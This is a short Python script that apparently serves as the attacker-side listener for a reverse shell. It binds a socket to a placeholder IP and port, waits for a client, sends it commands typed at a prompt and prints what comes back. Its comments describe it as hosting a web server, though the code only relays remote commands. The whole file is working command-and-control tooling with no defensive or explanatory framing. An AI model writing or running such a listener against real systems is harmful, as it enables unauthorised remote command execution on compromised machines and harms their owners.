import sys
import socket


# select the ip address of your machine (this will host the web server)
SERVER = "x.x.x.x" 
#select the port you would like you use
PORT = xxx

#Binding the SERVER and PORT
s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((SERVER, PORT))

#Setting up the system to listen
s.listen(1)

while True:
    print(f'[*] listening as {SERVER}:{PORT}')

    client = s.accept()
    print(f'[+] client connected {client[1]}')

#encode (extremely important)
    client[0].send('connected'.encode())
    while True:
        cmd = input('>>> ')
        client[0].send(cmd.encode())
#setting up options to kill your app
        if cmd.lower() in ['q', 'quit', 'x', 'exit']:
            break

        result = client[0].recv(1024).decode()
        print(result)

    client[0].close()

    cmd = input('Wait for new client y/n ') or 'y'
    if cmd.lower() in ['n', 'no']:
        break

s.close()
